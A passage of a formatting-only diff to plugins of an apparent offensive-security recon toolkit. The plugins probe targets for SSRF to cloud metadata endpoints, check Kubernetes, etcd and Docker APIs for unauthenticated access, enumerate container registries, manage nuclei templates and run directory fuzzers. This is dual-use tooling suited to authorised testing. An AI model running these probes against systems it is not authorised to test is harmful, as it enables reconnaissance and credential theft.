\"10\",\n+                    f\"{test_url}?url={metadata_url}\",\n+                ]\n                 result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)\n-                \n+\n                 if result.returncode == 0 and result.stdout:\n                     content = result.stdout.lower()\n-                    \n+\n                     # Check for metadata indicators\n                     metadata_indicators = [\n-                        'ami-id', 'instance-id', 'security-credentials',\n-                        'hostname', 'local-ipv4', 'public-ipv4',\n-                        'subscription', 'resourcegroupname', 'vmid',\n-                        'project-id', 'numeric-project-id', 'service-accounts'\n+                        \"ami-id\",\n+                        \"instance-id\",\n+                        \"security-credentials\",\n+                        \"hostname\",\n+                        \"local-ipv4\",\n+                        \"public-ipv4\",\n+                        \"subscription\",\n+                        \"resourcegroupname\",\n+                        \"vmid\",\n+                        \"project-id\",\n+                        \"numeric-project-id\",\n+                        \"service-accounts\",\n                     ]\n-                    \n+\n                     if any(indicator in content for indicator in metadata_indicators):\n-                        if '169.254.169.254' in metadata_url:\n-                            if 'ami-' in content or 'instance-' in content:\n+                        if \"169.254.169.254\" in metadata_url:\n+                            if \"ami-\" in content or \"instance-\" in content:\n                                 results[\"aws_metadata\"][\"ssrf_possible\"] = True\n                                 results[\"aws_metadata\"][\"endpoint\"] = endpoint\n-                            elif 'subscription' in content or 'resourcegroup' in content:\n+                            elif (\n+                                \"subscription\" in content or \"resourcegroup\" in content\n+                            ):\n                                 results[\"azure_metadata\"][\"ssrf_possible\"] = True\n                                 results[\"azure_metadata\"][\"endpoint\"] = endpoint\n-                        elif 'metadata.google.internal' in metadata_url:\n+                        elif \"metadata.google.internal\" in metadata_url:\n                             results[\"gcp_metadata\"][\"ssrf_possible\"] = True\n                             results[\"gcp_metadata\"][\"endpoint\"] = endpoint\n-            \n+\n             except Exception:\n                 continue\n-    \n+\n     return results\n+\n \n def scan_container_registries(base_name: str) -> Dict[str, Any]:\n     \"\"\"Scan for exposed container registries\"\"\"\n     results = {\n         \"docker_hub\": [],\n         \"aws_ecr\": [],\n         \"azure_acr\": [],\n         \"gcp_gcr\": [],\n-        \"timestamp\": time.time()\n+        \"timestamp\": time.time(),\n     }\n-    \n+\n     # Test Docker Hub\n-    docker_orgs = [base_name, base_name.replace('-', '')]\n-    \n+    docker_orgs = [base_name, base_name.replace(\"-\", \"\")]\n+\n     for org in docker_orgs:\n         try:\n             # Docker Hub API\n             hub_url = f\"https://hub.docker.com/v2/repositories/{org}/\"\n-            \n+\n             cmd = [\"curl\", \"-s\", \"--max-time\", \"10\", hub_url]\n             result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)\n-            \n+\n             if result.returncode == 0 and result.stdout:\n                 try:\n                     data = json.loads(result.stdout)\n                     if \"results\" in data:\n-                        results[\"docker_hub\"].append({\n-                            \"organization\": org,\n-                            \"repositories\": len(data.get(\"results\", [])),\n-                            \"public\": True\n-                        })\n+                        results[\"docker_hub\"].append(\n+                            {\n+                                \"organization\": org,\n+                                \"repositories\": len(data.get(\"results\", [])),\n+                                \"public\": True,\n+                            }\n+                        )\n                 except Exception as e:\n                     logging.warning(f\"Unexpected error: {e}\")\n                     # Consider if this error should be handled differently\n         except Exception:\n             continue\n-    \n+\n     # Test AWS ECR (public registries)\n     ecr_names = [base_name, f\"{base_name}-app\"]\n-    \n+\n     for registry in ecr_names:\n         try:\n             ecr_url = f\"https://gallery.ecr.aws/{registry}\"\n-            \n+\n             cmd = [\"curl\", \"-s\", \"-I\", \"--max-time\", \"10\", ecr_url]\n             result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)\n-            \n+\n             if result.returncode == 0 and \"200\" in result.stdout:\n-                results[\"aws_ecr\"].append({\n-                    \"registry\": registry,\n-                    \"url\": ecr_url,\n-                    \"accessible\": True\n-                })\n-        \n+                results[\"aws_ecr\"].append(\n+                    {\"registry\": registry, \"url\": ecr_url, \"accessible\": True}\n+                )\n+\n         except Exception:\n             continue\n-    \n+\n     return results\n+\n \n def scan_kubernetes_exposure(target: str) -> Dict[str, Any]:\n     \"\"\"Scan for Kubernetes API and Dashboard exposure\"\"\"\n-    results = {\n-        \"api_server\": {},\n-        \"dashboard\": {},\n-        \"etcd\": {},\n-        \"timestamp\": time.time()\n-    }\n-    \n-    base_url = target.rstrip('/')\n-    parsed = urlparse(target if target.startswith('http') else f\"http://{target}\")\n+    results = {\"api_server\": {}, \"dashboard\": {}, \"etcd\": {}, \"timestamp\": time.time()}\n+\n+    base_url = target.rstrip(\"/\")\n+    parsed = urlparse(target if target.startswith(\"http\") else f\"http://{target}\")\n     host = parsed.netloc or target\n-    \n+\n     # Common Kubernetes ports and endpoints\n     k8s_tests = [\n         {\"port\": \"6443\", \"endpoint\": \"/api/v1\", \"service\": \"API Server\"},\n         {\"port\": \"8080\", \"endpoint\": \"/api\", \"service\": \"Insecure API\"},\n         {\"port\": \"10250\", \"endpoint\": \"/pods\", \"service\": \"Kubelet API\"},\n         {\"port\": \"2379\", \"endpoint\": \"/v2/keys\", \"service\": \"etcd\"},\n-        {\"port\": \"8001\", \"endpoint\": \"/api/v1/namespaces/kube-system/services/kubernetes-dashboard/proxy/\", \"service\": \"Dashboard Proxy\"}\n+        {\n+            \"port\": \"8001\",\n+            \"endpoint\": \"/api/v1/namespaces/kube-system/services/kubernetes-dashboard/proxy/\",\n+            \"service\": \"Dashboard Proxy\",\n+        },\n     ]\n-    \n+\n     for test in k8s_tests:\n         try:\n             test_url = f\"http://{host}:{test['port']}{test['endpoint']}\"\n-            \n-            cmd = [\"curl\", \"-s\", \"-k\", \"--max-time\", \"10\", \"-w\", \"%{http_code}\", test_url]\n+\n+            cmd = [\n+                \"curl\",\n+                \"-s\",\n+                \"-k\",\n+                \"--max-time\",\n+                \"10\",\n+                \"-w\",\n+                \"%{http_code}\",\n+                test_url,\n+            ]\n             result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)\n-            \n+\n             if result.returncode == 0:\n-                lines = result.stdout.strip().split('\\n')\n+                lines = result.stdout.strip().split(\"\\n\")\n                 status_code = lines[-1] if lines else \"000\"\n-                content = '\\n'.join(lines[:-1]) if len(lines) > 1 else \"\"\n-                \n-                if status_code.startswith(('2', '4')):  # 2xx or 4xx responses indicate service is running\n+                content = \"\\n\".join(lines[:-1]) if len(lines) > 1 else \"\"\n+\n+                if status_code.startswith(\n+                    (\"2\", \"4\")\n+                ):  # 2xx or 4xx responses indicate service is running\n                     service_info = {\n                         \"port\": test[\"port\"],\n                         \"endpoint\": test[\"endpoint\"],\n                         \"status_code\": status_code,\n-                        \"accessible\": True\n+                        \"accessible\": True,\n                     }\n-                    \n+\n                     # Check for authentication\n-                    if \"unauthorized\" in content.lower() or \"forbidden\" in content.lower():\n+                    if (\n+                        \"unauthorized\" in content.lower()\n+                        or \"forbidden\" in content.lower()\n+                    ):\n                         service_info[\"authentication\"] = \"required\"\n-                    elif status_code.startswith('2'):\n+                    elif status_code.startswith(\"2\"):\n                         service_info[\"authentication\"] = \"none\"\n                         service_info[\"response_sample\"] = content[:500]\n-                    \n+\n                     if test[\"service\"] == \"API Server\":\n                         results[\"api_server\"] = service_info\n                     elif test[\"service\"] == \"etcd\":\n                         results[\"etcd\"] = service_info\n                     elif \"Dashboard\" in test[\"service\"]:\n                         results[\"dashboard\"] = service_info\n-        \n+\n         except Exception:\n             continue\n-    \n+\n     # Test for Docker daemon exposure\n     try:\n         docker_url = f\"http://{host}:2376/version\"\n-        \n+\n         cmd = [\"curl\", \"-s\", \"--max-time\", \"10\", docker_url]\n         result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)\n-        \n+\n         if result.returncode == 0 and \"docker\" in result.stdout.lower():\n             results[\"docker_daemon\"] = {\n                 \"port\": \"2376\",\n                 \"accessible\": True,\n-                \"version_info\": result.stdout\n+                \"version_info\": result.stdout,\n             }\n-    \n+\n     except Exception as e:\n-            logging.warning(f\"Operation failed: {e}\")\n-            # Consider if this error should be handled differently\n-    return results\n\\ No newline at end of file\n+        logging.warning(f\"Operation failed: {e}\")\n+        # Consider if this error should be handled differently\n+    return results\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/nuclei_template_manager.py\t2025-09-14 19:10:58.579755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/nuclei_template_manager.py\t2025-09-14 19:23:12.947557+00:00\n@@ -10,144 +10,152 @@\n import yaml\n \n plugin_info = {\n     \"name\": \"Enhanced Nuclei Template Manager\",\n     \"description\": \"Manage and integrate multiple community nuclei template sources\",\n-    \"version\": \"1.0.0\", \n+    \"version\": \"1.0.0\",\n     \"author\": \"@cxb3rf1lth\",\n     \"category\": \"template_management\",\n     \"requires_internet\": True,\n-    \"risk_level\": \"low\"\n+    \"risk_level\": \"low\",\n }\n+\n \n def execute(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):\n     \"\"\"Execute comprehensive nuclei template management\"\"\"\n     template_dir = run_dir / \"nuclei_templates\"\n     template_dir.mkdir(exist_ok=True)\n-    \n+\n     print(\"[NUCLEI] Enhanced template management starting...\")\n-    \n+\n     # Template repositories to manage\n     template_repos = [\n         {\n             \"name\": \"official\",\n             \"url\": \"https://github.com/projectdiscovery/nuclei-templates.git\",\n-            \"path\": Path.home() / \"nuclei-templates\"\n+            \"path\": Path.home() / \"nuclei-templates\",\n         },\n         {\n             \"name\": \"community\",\n-            \"url\": \"https://github.com/geeknik/the-nuclei-templates.git\", \n-            \"path\": Path.home() / \"nuclei-community\"\n+            \"url\": \"https://github.com/geeknik/the-nuclei-templates.git\",\n+            \"path\": Path.home() / \"nuclei-community\",\n         },\n         {\n             \"name\": \"fuzzing\",\n             \"url\": \"https://github.com/projectdiscovery/fuzzing-templates.git\",\n-            \"path\": Path.home() / \"nuclei-fuzzing\"\n+            \"path\": Path.home() / \"nuclei-fuzzing\",\n         },\n         {\n             \"name\": \"custom\",\n             \"url\": \"https://github.com/panch0r3d/nuclei-templates.git\",\n-            \"path\": Path.home() / \"custom-nuclei\"\n+            \"path\": Path.home() / \"custom-nuclei\",\n         },\n         {\n             \"name\": \"ksec\",\n             \"url\": \"https://github.com/knightsec/nuclei-templates-ksec.git\",\n-            \"path\": Path.home() / \"nuclei-ksec\"\n-        }\n+            \"path\": Path.home() / \"nuclei-ksec\",\n+        },\n     ]\n-    \n+\n     results = {\n         \"template_sources\": {},\n         \"statistics\": {},\n         \"custom_templates_created\": 0,\n-        \"total_templates\": 0\n+        \"total_templates\": 0,\n     }\n-    \n+\n     # Update/clone template repositories\n     for repo in template_repos:\n         print(f\"[NUCLEI] Managing {repo['name']} templates...\")\n         try:\n             if repo[\"path\"].exists() and (repo[\"path\"] / \".git\").exists():\n                 print(f\"[NUCLEI] Updating {repo['name']} templates\")\n                 subprocess.run(\n-                    [\"git\", \"pull\", \"--quiet\"], \n-                    cwd=repo[\"path\"], \n+                    [\"git\", \"pull\", \"--quiet\"],\n+                    cwd=repo[\"path\"],\n                     timeout=300,\n-                    capture_output=True\n+                    capture_output=True,\n                 )\n             else:\n                 print(f\"[NUCLEI] Cloning {repo['name']} templates\")\n                 repo[\"path\"].parent.mkdir(parents=True, exist_ok=True)\n-                subprocess.run([\n-                    \"git\", \"clone\", \"--depth\", \"1\", \n-                    repo[\"url\"], str(repo[\"path\"])\n-                ], timeout=600, capture_output=True)\n-            \n+                subprocess.run(\n+                    [\"git\", \"clone\", \"--depth\", \"1\", repo[\"url\"], str(repo[\"path\"])],\n+                    timeout=600,\n+                    capture_output=True,\n+                )\n+\n             # Count templates\n             template_count = count_templates(repo[\"path\"])\n             results[\"template_sources\"][repo[\"name\"]] = {\n                 \"path\": str(repo[\"path\"]),\n                 \"template_count\": template_count,\n-                \"status\": \"success\"\n+                \"status\": \"success\",\n             }\n             results[\"total_templates\"] += template_count\n-            \n+\n         except Exception as e:\n             print(f\"[NUCLEI] Error managing {repo['name']}: {e}\")\n             results[\"template_sources\"][repo[\"name\"]] = {\n                 \"status\": \"failed\",\n-                \"error\": str(e)\n+                \"error\": str(e),\n             }\n-    \n+\n     # Create custom templates for common vulnerabilities\n     custom_templates = create_custom_templates(template_dir)\n     results[\"custom_templates_created\"] = len(custom_templates)\n-    \n+\n     # Generate template statistics\n     results[\"statistics\"] = generate_template_statistics(template_repos)\n-    \n+\n     # Update nuclei templates cache\n     try:\n         print(\"[NUCLEI] Updating nuclei templates cache...\")\n-        subprocess.run([\"nuclei\", \"-update-templates\"], timeout=300, capture_output=True)\n+        subprocess.run(\n+            [\"nuclei\", \"-update-templates\"], timeout=300, capture_output=True\n+        )\n         results[\"cache_updated\"] = True\n     except Exception as e:\n         print(f\"[NUCLEI] Failed to update cache: {e}\")\n         results[\"cache_updated\"] = False\n-    \n+\n     # Save results\n     results_file = template_dir / \"template_management_results.json\"\n-    with open(results_file, 'w') as f:\n+    with open(results_file, \"w\") as f:\n         json.dump(results, f, indent=2)\n-    \n-    print(f\"[NUCLEI] Template management complete. Total templates: {results['total_templates']}\")\n+\n+    print(\n+        f\"[NUCLEI] Template management complete. Total templates: {results['total_templates']}\"\n+    )\n     return results\n+\n \n def count_templates(template_path: Path) -> int:\n     \"\"\"Count nuclei templates in a directory\"\"\"\n     if not template_path.exists():\n         return 0\n-    \n+\n     template_count = 0\n     for template_file in template_path.rglob(\"*.yaml\"):\n         try:\n-            with open(template_file, 'r') as f:\n+            with open(template_file, \"r\") as f:\n                 content = f.read()\n-                if 'id:' in content and 'info:' in content:\n+                if \"id:\" in content and \"info:\" in content:\n                     template_count += 1\n         except:\n             continue\n-    \n+\n     return template_count\n+\n \n def create_custom_templates(template_dir: Path) -> List[str]:\n     \"\"\"Create custom nuclei templates for enhanced testing\"\"\"\n     custom_dir = template_dir / \"custom\"\n     custom_dir.mkdir(exist_ok=True)\n-    \n+\n     templates = []\n-    \n+\n     # Enhanced security headers template\n     security_headers_template = \"\"\"id: enhanced-security-headers\n \n info:\n   name: Enhanced Security Headers Check\n@@ -174,16 +182,16 @@\n     extractors:\n       - type: kval\n         kval:\n           - header\n \"\"\"\n-    \n+\n     template_file = custom_dir / \"enhanced-security-headers.yaml\"\n-    with open(template_file, 'w') as f:\n+    with open(template_file, \"w\") as f:\n         f.write(security_headers_template)\n     templates.append(str(template_file))\n-    \n+\n     # Admin panel discovery template\n     admin_discovery_template = \"\"\"id: admin-panel-discovery\n \n info:\n   name: Admin Panel Discovery\n@@ -219,17 +227,17 @@\n           - \"login\"\n           - \"dashboard\"\n           - \"control panel\"\n         condition: or\n \"\"\"\n-    \n+\n     template_file = custom_dir / \"admin-panel-discovery.yaml\"\n-    with open(template_file, 'w') as f:\n+    with open(template_file, \"w\") as f:\n         f.write(admin_discovery_template)\n     templates.append(str(template_file))\n-    \n-    # Backup file discovery template  \n+\n+    # Backup file discovery template\n     backup_discovery_template = \"\"\"id: backup-file-discovery\n \n info:\n   name: Backup File Discovery\n   author: bl4ckc3ll-pantheon\n@@ -261,56 +269,57 @@\n           - \"backup\"\n           - \"database\"\n           - \"dump\"\n         condition: or\n \"\"\"\n-    \n+\n     template_file = custom_dir / \"backup-file-discovery.yaml\"\n-    with open(template_file, 'w') as f:\n+    with open(template_file, \"w\") as f:\n         f.write(backup_discovery_template)\n     templates.append(str(template_file))\n-    \n+\n     return templates\n+\n \n def generate_template_statistics(template_repos: List[Dict]) -> Dict[str, Any]:\n     \"\"\"Generate statistics about available templates\"\"\"\n     stats = {\n         \"total_repositories\": len(template_repos),\n         \"categories\": {},\n-        \"severity_distribution\": {}\n+        \"severity_distribution\": {},\n     }\n-    \n+\n     # Analyze templates by category and severity\n     for repo in template_repos:\n         if not repo[\"path\"].exists():\n             continue\n-            \n+\n         for template_file in repo[\"path\"].rglob(\"*.yaml\"):\n             try:\n-                with open(template_file, 'r') as f:\n+                with open(template_file, \"r\") as f:\n                     content = yaml.safe_load(f)\n-                    \n-                if not content or 'info' not in content:\n+\n+                if not content or \"info\" not in content:\n                     continue\n-                    \n-                info = content['info']\n-                \n+\n+                info = content[\"info\"]\n+\n                 # Count by tags/categories\n-                tags = info.get('tags', [])\n+                tags = info.get(\"tags\", [])\n                 if isinstance(tags, str):\n                     tags = [tags]\n-                \n+\n                 for tag in tags:\n                     if tag not in stats[\"categories\"]:\n                         stats[\"categories\"][tag] = 0\n                     stats[\"categories\"][tag] += 1\n-                \n+\n                 # Count by severity\n-                severity = info.get('severity', 'unknown')\n+                severity = info.get(\"severity\", \"unknown\")\n                 if severity not in stats[\"severity_distribution\"]:\n                     stats[\"severity_distribution\"][severity] = 0\n                 stats[\"severity_distribution\"][severity] += 1\n-                \n+\n             except Exception:\n                 continue\n-    \n-    return stats\n\\ No newline at end of file\n+\n+    return stats\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/enhanced_fuzzing.py\t2025-09-14 19:10:58.579755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/enhanced_fuzzing.py\t2025-09-14 19:23:12.977475+00:00\n@@ -8,417 +8,512 @@\n import shutil\n \n plugin_info = {\n     \"name\": \"Enhanced Fuzzing Suite\",\n     \"description\": \"Comprehensive directory and file fuzzing with multiple tools and wordlists\",\n-    \"version\": \"1.0.0\", \n+    \"version\": \"1.0.0\",\n     \"author\": \"@cxb3rf1lth\",\n     \"category\": \"fuzzing\",\n     \"requires_internet\": False,\n-    \"risk_level\": \"low\"\n+    \"risk_level\": \"low\",\n }\n+\n \n def execute(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):\n     \"\"\"Execute comprehensive fuzzing with multiple tools\"\"\"\n     fuzzing_dir = run_dir / \"enhanced_fuzzing\"\n     fuzzing_dir.mkdir(exist_ok=True)\n-    \n+\n     # Read targets\n     targets_file = Path(__file__).parent.parent / \"targets.txt\"\n     if not targets_file.exists():\n         print(\"[FUZZING] No targets file found\")\n         return\n-    \n+\n     targets = []\n-    with open(targets_file, 'r') as f:\n+    with open(targets_file, \"r\") as f:\n         for line in f:\n             target = line.strip()\n-            if target and not target.startswith('#'):\n+            if target and not target.startswith(\"#\"):\n                 targets.append(target)\n-    \n+\n     if not targets:\n         print(\"[FUZZING] No targets found\")\n         return\n-    \n+\n     results = {\n         \"targets_scanned\": len(targets),\n         \"tools_used\": [],\n         \"total_endpoints_found\": 0,\n-        \"results_by_target\": {}\n+        \"results_by_target\": {},\n     }\n-    \n+\n     # Get fuzzing configuration\n     fuzzing_cfg = cfg.get(\"fuzzing\", {})\n-    \n+\n     for target in targets:\n         print(f\"[FUZZING] Starting enhanced fuzzing for: {target}\")\n         target_results = {}\n-        \n+\n         target_url = target if target.startswith(\"http\") else f\"http://{target}\"\n         target_dir = fuzzing_dir / target.replace(\".\", \"_\").replace(\"/\", \"_\")\n         target_dir.mkdir(exist_ok=True)\n-        \n+\n         # 1. FFUF Fuzzing\n         if fuzzing_cfg.get(\"enable_ffuf\", True) and shutil.which(\"ffuf\"):\n             print(\"[FUZZING] Running FFUF directory fuzzing...\")\n             ffuf_results = run_ffuf_fuzzing(target_url, target_dir, env, fuzzing_cfg)\n             target_results[\"ffuf\"] = ffuf_results\n             results[\"tools_used\"].append(\"ffuf\")\n-        \n+\n         # 2. Feroxbuster Fuzzing\n         if fuzzing_cfg.get(\"enable_feroxbuster\", True) and shutil.which(\"feroxbuster\"):\n             print(\"[FUZZING] Running Feroxbuster fuzzing...\")\n-            ferox_results = run_feroxbuster_fuzzing(target_url, target_dir, env, fuzzing_cfg)\n+            ferox_results = run_feroxbuster_fuzzing(\n+                target_url, target_dir, env, fuzzing_cfg\n+            )\n             target_results[\"feroxbuster\"] = ferox_results\n             results[\"tools_used\"].append(\"feroxbuster\")\n-        \n+\n         # 3. Gobuster Fuzzing\n         if fuzzing_cfg.get(\"enable_gobuster\", True) and shutil.which(\"gobuster\"):\n             print(\"[FUZZING] Running Gobuster directory fuzzing...\")\n-            gobuster_results = run_gobuster_fuzzing(target_url, target_dir, env, fuzzing_cfg)\n+            gobuster_results = run_gobuster_fuzzing(\n+                target_url, target_dir, env, fuzzing_cfg\n+            )\n             target_results[\"gobuster\"] = gobuster_results\n             results[\"tools_used\"].append(\"gobuster\")\n-        \n-        # 4. Dirb Fuzzing  \n+\n+        # 4. Dirb Fuzzing\n         if fuzzing_cfg.get(\"enable_dirb\", True) and shutil.which(\"dirb\"):\n             print(\"[FUZZING] Running Dirb fuzzing...\")\n             dirb_results = run_dirb_fuzzing(target_url, target_dir, env, fuzzing_cfg)\n             target_results[\"dirb\"] = dirb_results\n             results[\"tools_used\"].append(\"dirb\")\n-        \n+\n         # 5. Parameter Fuzzing\n         if fuzzing_cfg.get(\"parameter_fuzzing\", True):\n             print(\"[FUZZING] Running parameter fuzzing...\")\n-            param_results = run_parameter_fuzzing(target_url, target_dir, env, fuzzing_cfg)\n+            param_results = run_parameter_fuzzing(\n+                target_url, target_dir, env, fuzzing_cfg\n+            )\n             target_results[\"parameters\"] = param_results\n-        \n+\n         # 6. Subdomain Fuzzing\n         if fuzzing_cfg.get(\"subdomain_fuzzing\", True):\n             print(\"[FUZZING] Running subdomain fuzzing...\")\n-            subdomain_results = run_subdomain_fuzzing(target, target_dir, env, fuzzing_cfg)\n+            subdomain_results = run_subdomain_fuzzing(\n+                target, target_dir, env, fuzzing_cfg\n+            )\n             target_results[\"subdomains\"] = subdomain_results\n-        \n+\n         # Count total endpoints found\n         total_endpoints = 0\n         for tool_results in target_results.values():\n             if isinstance(tool_results, dict) and \"endpoints_found\" in tool_results:\n                 total_endpoints += tool_results[\"endpoints_found\"]\n-        \n+\n         target_results[\"total_endpoints\"] = total_endpoints\n         results[\"results_by_target\"][target] = target_results\n         results[\"total_endpoints_found\"] += total_endpoints\n-    \n+\n     # Remove duplicates from tools_used\n     results[\"tools_used\"] = list(set(results[\"tools_used\"]))\n-    \n+\n     # Save comprehensive results\n     results_file = fuzzing_dir / \"enhanced_fuzzing_results.json\"\n-    with open(results_file, 'w') as f:\n+    with open(results_file, \"w\") as f:\n         json.dump(results, f, indent=2)\n-    \n-    print(f\"[FUZZING] Enhanced fuzzing complete. Total endpoints found: {results['total_endpoints_found']}\")\n-    return results\n+\n+    print(\n+        f\"[FUZZING] Enhanced fuzzing complete. Total endpoints found: {results['total_endpoints_found']}\"\n+    )\n+    return results\n+\n \n def get_wordlists() -> Dict[str, Path]:\n     \"\"\"Get available wordlists for fuzzing\"\"\"\n     base_path = Path(__file__).parent.parent\n     wordlists = {}\n-    \n+\n     # Priority order wordlists\n     wordlist_candidates = [\n         # Merged lists (highest priority)\n         base_path / \"lists_merged\" / \"directories_merged.txt\",\n         base_path / \"lists_merged\" / \"files_merged.txt\",\n-        \n         # SecLists\n-        base_path / \"external_lists\" / \"SecLists\" / \"Discovery\" / \"Web-Content\" / \"directory-list-2.3-medium.txt\",\n-        base_path / \"external_lists\" / \"SecLists\" / \"Discovery\" / \"Web-Content\" / \"common.txt\",\n-        base_path / \"external_lists\" / \"SecLists\" / \"Discovery\" / \"Web-Content\" / \"raft-medium-files.txt\",\n-        \n+        base_path\n+        / \"external_lists\"\n+        / \"SecLists\"\n+        / \"Discovery\"\n+        / \"Web-Content\"\n+        / \"directory-list-2.3-medium.txt\",\n+        base_path\n+        / \"external_lists\"\n+        / \"SecLists\"\n+        / \"Discovery\"\n+        / \"Web-Content\"\n+        / \"common.txt\",\n+        base_path\n+        / \"external_lists\"\n+        / \"SecLists\"\n+        / \"Discovery\"\n+        / \"Web-Content\"\n+        / \"raft-medium-files.txt\",\n         # OneListForAll\n         base_path / \"external_lists\" / \"OneListForAll\" / \"onelistforall.txt\",\n-        \n         # Custom wordlists\n         base_path / \"wordlists_extra\" / \"paths_extra.txt\",\n-        \n         # Fallback\n         Path(\"/usr/share/wordlists/dirb/common.txt\"),\n-        Path(\"/usr/share/dirb/wordlists/common.txt\")\n+        Path(\"/usr/share/dirb/wordlists/common.txt\"),\n     ]\n-    \n+\n     for wordlist in wordlist_candidates:\n         if wordlist.exists() and wordlist.stat().st_size > 0:\n-            category = \"directories\" if \"directory\" in wordlist.name.lower() else \"files\"\n+            category = (\n+                \"directories\" if \"directory\" in wordlist.name.lower() else \"files\"\n+            )\n             if category not in wordlists:\n                 wordlists[category] = wordlist\n-    \n+\n     return wordlists\n \n-def run_ffuf_fuzzing(target: str, output_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]) -> Dict[str, Any]:\n+\n+def run_ffuf_fuzzing(\n+    target: str, output_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]\n+) -> Dict[str, Any]:\n     \"\"\"Run FFUF fuzzing with enhanced configuration\"\"\"\n     wordlists = get_wordlists()\n     results = {\"endpoints_found\": 0, \"status_codes\": {}, \"interesting_files\": []}\n-    \n+\n     for category, wordlist in wordlists.items():\n         output_file = output_dir / f\"ffuf_{category}.json\"\n-        \n-        target_fuzz = target.rstrip('/') + '/FUZZ'\n-        \n+\n+        target_fuzz = target.rstrip(\"/\") + \"/FUZZ\"\n+\n         cmd = [\n-            \"ffuf\", \n-            \"-u\", target_fuzz,\n-            \"-w\", str(wordlist),\n-            \"-o\", str(output_file),\n-            \"-of\", \"json\",\n-            \"-mc\", cfg.get(\"status_codes\", \"200,201,202,204,301,302,303,307,308,401,403,405\"),\n-            \"-fs\", \"0\",\n-            \"-t\", str(cfg.get(\"threads\", 50)),\n-            \"-timeout\", \"10\",\n-            \"-s\"  # Silent mode\n+            \"ffuf\",\n+            \"-u\",\n+            target_fuzz,\n+            \"-w\",\n+            str(wordlist),\n+            \"-o\",\n+            str(output_file),\n+            \"-of\",\n+            \"json\",\n+            \"-mc\",\n+            cfg.get(\"status_codes\", \"200,201,202,204,301,302,303,307,308,401,403,405\"),\n+            \"-fs\",\n+            \"0\",\n+            \"-t\",\n+            str(cfg.get(\"threads\", 50)),\n+            \"-timeout\",\n+            \"10\",\n+            \"-s\",  # Silent mode\n         ]\n-        \n+\n         # Add extensions for file fuzzing\n         if category == \"files\":\n-            extensions = cfg.get(\"extensions\", \"php,asp,aspx,jsp,html,htm,txt,bak,old,conf\")\n+            extensions = cfg.get(\n+                \"extensions\", \"php,asp,aspx,jsp,html,htm,txt,bak,old,conf\"\n+            )\n             cmd.extend([\"-e\", extensions])\n-        \n+\n         try:\n-            subprocess.run(cmd, timeout=1200, cwd=output_dir, env=env, capture_output=True)\n-            \n+            subprocess.run(\n+                cmd, timeout=1200, cwd=output_dir, env=env, capture_output=True\n+            )\n+\n             # Parse results\n             if output_file.exists():\n-                with open(output_file, 'r') as f:\n+                with open(output_file, \"r\") as f:\n                     ffuf_data = json.load(f)\n-                    \n+\n                 for result in ffuf_data.get(\"results\", []):\n                     results[\"endpoints_found\"] += 1\n                     status = result.get(\"status\", 0)\n                     if status not in results[\"status_codes\"]:\n                         results[\"status_codes\"][status] = 0\n                     results[\"status_codes\"][status] += 1\n-                    \n+\n                     # Identify interesting files\n                     url = result.get(\"url\", \"\")\n-                    if any(ext in url.lower() for ext in [\".bak\", \".old\", \".conf\", \".config\", \".sql\", \".zip\"]):\n+                    if any(\n+                        ext in url.lower()\n+                        for ext in [\".bak\", \".old\", \".conf\", \".config\", \".sql\", \".zip\"]\n+                    ):\n                         results[\"interesting_files\"].append(url)\n-        \n+\n         except Exception as e:\n             results[f\"error_{category}\"] = str(e)\n-    \n-    return results\n-\n-def run_feroxbuster_fuzzing(target: str, output_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]) -> Dict[str, Any]:\n+\n+    return results\n+\n+\n+def run_feroxbuster_fuzzing(\n+    target: str, output_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]\n+) -> Dict[str, Any]:\n     \"\"\"Run Feroxbuster fuzzing\"\"\"\n     wordlists = get_wordlists()\n     results = {\"endpoints_found\": 0, \"directories\": [], \"files\": []}\n-    \n+\n     wordlist = wordlists.get(\"directories\")\n     if not wordlist:\n         return {\"error\": \"No wordlist found for feroxbuster\"}\n-    \n+\n     output_file = output_dir / \"feroxbuster_results.txt\"\n-    \n+\n     cmd = [\n         \"feroxbuster\",\n-        \"-u\", target,\n-        \"-w\", str(wordlist),\n-        \"-o\", str(output_file),\n-        \"-t\", str(cfg.get(\"threads\", 50)),\n-        \"-s\", cfg.get(\"status_codes\", \"200,204,301,302,307,308,401,403,405,500\"),\n+        \"-u\",\n+        target,\n+        \"-w\",\n+        str(wordlist),\n+        \"-o\",\n+        str(output_file),\n+        \"-t\",\n+        str(cfg.get(\"threads\", 50)),\n+        \"-s\",\n+        cfg.get(\"status_codes\", \"200,204,301,302,307,308,401,403,405,500\"),\n         \"--auto-tune\",\n-        \"--no-recursion\" if not cfg.get(\"recursive_fuzzing\", True) else \"-r\"\n+        \"--no-recursion\" if not cfg.get(\"recursive_fuzzing\", True) else \"-r\",\n     ]\n-    \n+\n     # Add extensions\n     extensions = cfg.get(\"extensions\", \"php,asp,aspx,jsp,html,htm,txt\")\n     if extensions:\n         cmd.extend([\"-x\", extensions])\n-    \n+\n     try:\n         subprocess.run(cmd, timeout=1200, cwd=output_dir, env=env, capture_output=True)\n-        \n+\n         # Parse results\n         if output_file.exists():\n-            with open(output_file, 'r') as f:\n+            with open(output_file, \"r\") as f:\n                 for line in f:\n                     if \"200\" in line or \"301\" in line or \"302\" in line:\n                         results[\"endpoints_found\"] += 1\n-                        if line.strip().endswith('/'):\n+                        if line.strip().endswith(\"/\"):\n                             results[\"directories\"].append(line.strip())\n                         else:\n                             results[\"files\"].append(line.strip())\n-    \n+\n     except Exception as e:\n         results[\"error\"] = str(e)\n-    \n-    return 